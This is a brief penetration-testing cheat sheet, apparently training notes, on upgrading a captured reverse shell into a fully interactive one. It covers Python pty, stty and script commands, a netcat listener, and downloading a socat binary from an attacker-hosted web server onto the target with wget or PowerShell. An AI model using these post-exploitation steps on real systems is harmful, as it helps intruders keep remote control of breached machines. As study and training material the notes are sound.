# Stabilize shell


The Python interpreter, frequently installed on Linux systems, comes with a standard module named pty that allows for creation of pseudo-terminals.
By using this module, we can spawn a separate process from our remote shell and obtain a fully interactive shell.


- make sure we have TTY functionality by using the Python 3's `pty` module
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```


### Upgrade simple shell to tty shell to fully interactive shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
USER@ubuntu:~$ ^Z                    //<- Press Ctrl +Z           
zsh: suspended  nc -lvp 13337
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvp 13337
                               reset
reset: unknown terminal type unknown
Terminal type? screen
USER@ubuntu:~$ export TERM=xterm
```
For windows, use this [tool](https://github.com/antonioCoco/ConPtyShell)






```
# step 1
python -c 'import pty;pty.spawn("/bin/bash")' # note that some targets may need the version of Python specified
# step 2
export TERM=xterm # this will give us access to term commands such as clear  
# step 3
stty raw -echo; fg # it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process. Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

```



```
script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
# Then press Enter twice, and then enter:
export TERM=xterm
```






It's also useful to be able to change your terminal tty size. First check the current values with: `stty -a` and then change it with `stty rows NUMBER` and `stty cols NUMBER`.



Another way stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.


